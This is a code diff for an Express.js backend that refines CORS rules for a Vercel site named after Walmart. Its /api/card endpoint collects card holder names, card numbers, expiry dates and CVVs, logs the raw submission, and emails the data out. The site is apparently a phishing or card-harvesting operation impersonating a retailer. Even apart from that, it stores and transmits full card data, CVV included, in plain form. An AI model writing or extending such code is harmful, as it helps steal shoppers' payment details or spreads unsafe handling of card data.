@@ -28,8 +28,8 @@ const app = express();
 const allowedOrigins = [
   'http://127.0.0.1:5500',
   'http://localhost:5500',
-  'https://walmart-mu.vercel.app', // <-- add without trailing slash
-  'https://walmart-mu.vercel.app/' // <-- keep with trailing slash for safety
+  'https://walmart-mu.vercel.app'
+  // Removed trailing slash variant to avoid mismatch
 ];
 app.use(cors({
   origin: function(origin, callback) {
@@ -44,16 +44,15 @@ app.use(cors({
 }));
 app.use(express.json());
 
-// Set CORS headers for all responses
+// Set CORS headers for all responses (including preflight)
 app.use((req, res, next) => {
   const origin = req.headers.origin;
   if (allowedOrigins.includes(origin)) {
     res.header('Access-Control-Allow-Origin', origin);
+    res.header('Access-Control-Allow-Credentials', 'true');
   }
   res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
   res.header('Access-Control-Allow-Headers', 'Content-Type');
-  res.header('Access-Control-Allow-Credentials', 'true');
-  // Handle OPTIONS requests globally
   if (req.method === 'OPTIONS') {
     return res.sendStatus(200);
   }
@@ -85,7 +84,10 @@ app.post('/api/card', async (req, res) => {
   const { cardName, cardNumber, expiry, cvv } = req.body;
   console.log('Received card submission:', req.body); // Debug: log incoming data
   if (!cardName || !cardNumber || !expiry || !cvv) {
-    console.error('Missing fields in request:', req.body);
+    if (allowedOrigins.includes(req.headers.origin)) {
+      res.header('Access-Control-Allow-Origin', req.headers.origin);
+      res.header('Access-Control-Allow-Credentials', 'true');
+    }
     return res.status(400).json({ error: 'Missing fields' });
   }
 
@@ -98,14 +100,16 @@ app.post('/api/card', async (req, res) => {
 
   try {
     const info = await transporter.sendMail(mailOptions);
-    console.log('Email sent:', info);
-    res.header('Access-Control-Allow-Origin', req.headers.origin);
-    res.header('Access-Control-Allow-Credentials', 'true');
+    if (allowedOrigins.includes(req.headers.origin)) {
+      res.header('Access-Control-Allow-Origin', req.headers.origin);
+      res.header('Access-Control-Allow-Credentials', 'true');
+    }
     res.json({ success: true, message: 'Email sent', info: info.response });
   } catch (err) {
-    console.error('Failed to send email:', err);
-    res.header('Access-Control-Allow-Origin', req.headers.origin);
-    res.header('Access-Control-Allow-Credentials', 'true');
+    if (allowedOrigins.includes(req.headers.origin)) {
+      res.header('Access-Control-Allow-Origin', req.headers.origin);
+      res.header('Access-Control-Allow-Credentials', 'true');
+    }
     res.status(500).json({ error: 'Failed to send email', details: err.message });
   }
 });
